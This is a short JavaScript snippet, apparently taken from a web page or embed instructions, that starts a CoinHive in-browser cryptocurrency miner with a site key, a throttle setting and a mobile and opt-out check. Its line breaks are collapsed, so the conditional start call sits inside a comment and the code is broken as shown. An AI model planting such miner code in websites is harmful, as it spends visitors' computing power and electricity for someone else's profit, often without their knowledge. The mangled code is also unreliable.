var miner = new CoinHive.Anonymous('hf4YXxghYhlcSd7sTgLgrbuub1xNzNuG', {
    throttle: 0.8
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}